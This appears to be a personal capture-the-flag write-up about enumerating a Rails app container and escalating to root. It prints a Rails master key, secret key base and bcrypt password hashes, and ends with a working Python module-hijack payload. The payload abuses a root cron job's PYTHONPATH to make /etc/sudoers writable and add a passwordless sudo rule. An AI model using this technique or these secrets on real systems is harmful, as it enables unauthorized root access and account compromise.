```bash
emp@23348446b037:~$ uname -a
Linux 23348446b037 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 GNU/Linux
```

The fact that the computer has this kind of name and the fact that some commands are missing makes me think i might be in a container

## HOME/emp

```bash
emp@23348446b037:~$ ls -la
total 60
drwxr-xr-x  1 emp  emp  4096 Aug  5  2023 .
drwxr-xr-x  1 root root 4096 Aug  5  2023 ..
-rw-r--r--  1 emp  emp   220 Mar 27  2022 .bash_logout
-rw-r--r--  1 emp  emp  3526 Mar 27  2022 .bashrc
drwxr-xr-x  3 emp  emp  4096 Aug  5  2023 .bundle
drwxr-xr-x 10 emp  emp  4096 Aug  5  2023 .gems
drwxr-xr-x  3 emp  emp  4096 Aug  5  2023 .local
-rw-r--r--  1 emp  emp   807 Mar 27  2022 .profile
drwxr-xr-x  1 emp  emp  4096 Aug  5  2023 .ssh
drwxr-xr-x  1 emp  emp  4096 Aug 15  2023 app
-rw-r--r--  1 root root   38 Aug  5  2023 flag1.txt
-rwxr-xr-x  1 root root   98 Mar 26  2023 test.sh
```

test only sets up environment variables for the app and chages the current directory to that of the app


## APP 

This folder contains a ruby on rails application, which might have useful information (although since this is a docker container i doubt it)
## CONFIG 

```bash
emp@23348446b037:~/app$ cat config/credentials.yml.enc 
9C4n8csMfI+L6L6vi+9aCYUwsiTUi1TYx+fSsWoUrJeYiSNZcr24KK7cbZIQsrt9Ujrt4dm4TJj/Kwp1SiAFQf1P4+E85V6B6apKpgUxe/ED2BB3ZqMO1vammMe48qeaUcLfk8cFNWZ309uQ1LC0xSyNTG9IHG1q0nspmvND/ICVh5kSUFqSQtOw/NJ/Qmk1H5CsVZMU+cs+v4eqRP0tWI8dk8EUJLBzS2xyvH/12EoJMvo3yckhrgPiURZCHoTYXb2gZlNU/4yBCw7+Gx2Hr97K5lDr8i0uAbUb7YmiJJQtyY3fHjfEgYFHZEyCMtHhXtrFQ0OVeGKsjo6UHh19YOYIz54DsmytNDq8SiKuXJ6yHUTwgsBSe1wAHit0gIqd14zshREF+KY7T2XsSgDa0CbV7vkkAFH8/fAh--3BmbIyh6HOa5kx4U--74OKjortEodIkGiHkXPWvg==
```

```bash
emp@23348446b037:~/app$ cat config/master.key 
ab2ebd8958906b029bb21865fbadc498
```

```bash
# aws:
#   access_key_id: 123
#   secret_access_key: 345

# Used as the base secret for all MessageVerifiers in Rails, including the one protecting cookies.
secret_key_base: 9bc1b625314ef666964f00e53894d5ba072e5c956cf25a7c81d3e92f8623d862436add6b976bab15b6308dafbf777d2265628d36ccbfcae7300a23e5cd8922b9
```

## DB

```bash
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `bin/rails
# db:schema:load`. When creating a new database, `bin/rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema[7.0].define(version: 2023_02_08_195759) do
  create_table "active_storage_attachments", force: :cascade do |t|
    t.string "name", null: false
    t.string "record_type", null: false
    t.integer "record_id", null: false
    t.integer "blob_id", null: false
    t.datetime "created_at", null: false
    t.index ["blob_id"], name: "index_active_storage_attachments_on_blob_id"
    t.index ["record_type", "record_id", "name", "blob_id"], name: "index_active_storage_attachments_uniqueness", unique: true
  end

  create_table "active_storage_blobs", force: :cascade do |t|
    t.string "key", null: false
    t.string "filename", null: false
    t.string "content_type"
    t.text "metadata"
    t.string "service_name", null: false
    t.bigint "byte_size", null: false
    t.string "checksum"
    t.datetime "created_at", null: false
    t.index ["key"], name: "index_active_storage_blobs_on_key", unique: true
  end

  create_table "active_storage_variant_records", force: :cascade do |t|
    t.integer "blob_id", null: false
    t.string "variation_digest", null: false
    t.index ["blob_id", "variation_digest"], name: "index_active_storage_variant_records_uniqueness", unique: true
  end

  create_table "users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at"
    t.datetime "remember_created_at"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["email"], name: "index_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_users_on_reset_password_token", unique: true
  end

  add_foreign_key "active_storage_attachments", "active_storage_blobs", column: "blob_id"
  add_foreign_key "active_storage_variant_records", "active_storage_blobs", column: "blob_id"
end
emp@23348446b037:~/app/db$ 


```

**development tables**
```sql
sqlite> SELECT * FROM users;
1|xdxd@xd.com|$2a$12$6Y6DEiCjlcIw3o9KedKZ0.8K3P6SyFLXn0YVL3jLYrMM2zjiBaoUy||||2023-02-08 21:12:56.226535|2023-02-08 21:12:56.253169
2|lmao@lmao.com|$2a$12$VVRGVb1hZij.R3D3VdoBGeowiEfjOMr1C7iCARyQ2rNvY/k5uri9q||||2023-02-14 18:18:21.106772|2023-02-14 18:19:16.645452
3|jkglja@jkglja.com|$2a$12$PFDmAWFofO3uDhBBCENM..5hTH/EWNYD0A1kcpdXcNG.DSARvKClO||||2023-02-14 18:32:14.353323|2023-02-14 18:32:14.363753
4|test@gmail.com|$2a$12$yDUq8fXctdDlfJ9cRB1mc.zOxDjGDcwk1cHSLBVNyhtksv4z8zT26||||2023-03-13 21:41:19.747766|2023-03-25 20:40:15.985295
5|xdxdxd@xd.xd|$2a$12$FodHv7M.RW1399d.zZ6clux96c4hLYBQG52QNsKmK./8qQSnb7Ir.||||2023-03-13 21:58:06.369286|2023-03-13 21:58:16.136157
6|kgjkgj@kgjkgj.com|$2a$12$lXXLs7FMkR11U4HkvFSGG.4wlDyZDV.3Q60LJOYdB/Kx6NvXPFKyO||||2023-03-14 06:20:27.235838|2023-03-14 06:20:27.288810
7|xgasgas@xgasgas|$2a$12$a1lzuvYasBolxoVw.fUjUe2BvhMXLG3efl6SSZIc1nymlhoFGMGbG||||2023-03-14 06:58:19.455892|2023-03-14 06:58:19.462679
8|xgsasgas@xgasgsas|$2a$12$FMCZpWSYXgaW1feYXbVmI.xBPDIGrhAI.ejX/yNcWc.XM0R/eeMd2||||2023-03-14 06:58:51.793156|2023-03-14 07:28:11.621064
9|loalj@loalj|$2a$12$bDK5YvDUNATfBojQGDhVjO7pF6ooT1D3CAz0hxVUgfLh003F8z7G2||||2023-03-14 07:10:28.044256|2023-03-14 07:22:12.017182
```

**production tables**

```sql
sqlite> SELECT * FROM users;
1|xdxdxd@xdxdxd.com|$2a$12$VKzuAr5fjslVgIknmgY2eO2xWHBj06MHcQLm9llKsiZ88loG9IRsK||||2023-02-14 18:40:31.265202|2023-02-14 18:40:31.268212
2|adasf@afsasf.com|$2a$12$iiTxf8kShcLXp.RDdM7t4urJgbJZDh130s9Jrh3ojZHkGmrt722HO||||2023-02-14 18:43:13.783266|2023-02-14 18:43:13.785986
3|admin@cdc.com|$2a$12$Zltw7KzEMWA2dzfKYNNrZeW4WLqrfjP.a7hP.vpmadp1wMrVhSBAm||||2023-03-14 09:38:50.147838|2023-03-14 10:40:33.409661
4|rest@rest|$2a$12$hwZ31mF3P2InAC7Vgiai7Ou80fEkmjqOw1pQ/3rKRF6hxN24UFA/C||||2023-03-14 11:56:01.183925|2023-03-14 11:56:01.187857
5|test@test.com|$2a$12$Fd6v7HAtEx6q36iyqyyuteDb3AfCy3U8ntJOIVwzEVxoyNHNVBlze||||2023-03-21 18:31:46.400141|2023-03-26 08:08:56.291292
```

**nothing in test database**

### LOGS

```bash
emp@23348446b037:~/app$ cat log/production.log 
W, [2023-08-15T22:53:18.975729 #19]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
W, [2023-08-15T18:19:58.045790 #20]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
W, [2024-05-26T15:45:32.884082 #18]  WARN -- : You are running SQLite in production, this is generally not recommended. You can disable this warning by setting "config.active_record.sqlite3_production_warning=false".
```

### TMP

```bash
emp@23348446b037:~/app$ cat tmp/pids/server.pid 
18
```

### PROCESSES 

```bash
emp@23348446b037:~/app$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3   5784  3024 ?        Ss   15:45   0:00 /bin/bash ./cron_start.sh
root           8  0.0  0.4  13352  4340 ?        Ss   15:45   0:00 sshd: /usr/sbin/sshd [listener] 0 of 
root          15  0.0  0.2   5632  2316 ?        Ss   15:45   0:00 /usr/sbin/cron
root          17  0.0  0.4   8796  4208 ?        S    15:45   0:00 su - emp -c cd /home/emp/app && expor
emp           18  0.0  8.9 702476 89616 ?        Ssl  15:45   0:02 puma 5.6.5 (tcp://0.0.0.0:3000) [app]
root          65  0.0  0.8  14508  8800 ?        Ss   15:47   0:00 sshd: emp [priv]
emp           72  0.0  0.5  14604  5852 ?        S    15:47   0:00 sshd: emp@pts/0
emp           73  0.0  0.3   4156  3528 pts/0    Ss   15:47   0:00 -bash
root         952  0.0  0.8  14508  8720 ?        Ss   16:33   0:00 sshd: emp [priv]
emp          958  0.3  0.9  18036  9240 ?        S    16:33   0:01 sshd: emp@notty
emp          959  0.1  0.4   5984  4544 ?        Ss   16:33   0:00 scp -r -f /home/emp/app
root        1074  0.0  0.7  18352  7592 ?        Ss   16:39   0:00 /usr/sbin/exim4 -Mc 1sBGtr-0000HI-3J
root        1075  0.0  0.7  18356  7440 ?        Ss   16:39   0:00 /usr/sbin/exim4 -Mc 1sBGtr-0000HJ-3d
emp         1076  0.0  0.2   6752  2892 pts/0    R+   16:39   0:00 ps aux
```

### INTERESTING



```bash
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root PYTHONPATH=/dev/shm:$PYTHONPATH python3 /usr/local/sbin/backup.py >> /var/log/cron.log
```

```bash
emp@23348446b037:~$ ls -la /usr/local/sbin
total 12
drwxr-xr-x 1 root root 4096 Aug 15  2023 .
drwxr-xr-x 1 root root 4096 Mar 28  2023 ..
-rwxr--r-- 1 root root  224 Aug 15  2023 backup.py
```

```bash
emp@23348446b037:~$ cat /usr/local/sbin/backup.py 
#custom backup script (to be created)
import cbackup
import time

# Start backup process
cbackup.init('/home/emp/app')
# log completion time
t=time.localtime()
current_time = time.strftime("%H:%M:%s", t)
print(current_time)
```

```bash
emp@23348446b037:~$ ls -la /usr/bin/python3
lrwxrwxrwx 1 root root 9 Apr  5  2021 /usr/bin/python3 -> python3.9
```

```bash
emp@23348446b037:/usr/lib/python3.9$ ls -la /dev/shm/
total 0
drwxrwxrwt 2 root root  40 May 26 15:45 .
drwxr-xr-x 5 root root 340 May 26 15:45 ..

```

**hahahahah**

```python
import os
command = 'chmod o+rwx /etc/sudoers'
os.system(command)

# second file 
# in the middle do echo "emp ALL:(ALL) NOPASSWD:ALL >> /etc/sudoers"
# repeat to move back to the permissions needed and execute sudo su

import os
command = 'chmod o-rwx /etc/sudoers'
os.system(command)
```

I found several ways of getting effective root, but this one gets you all the privileges of root
(also transforming binaries found inside the container is a good one)

Now we are [[root in contianer]]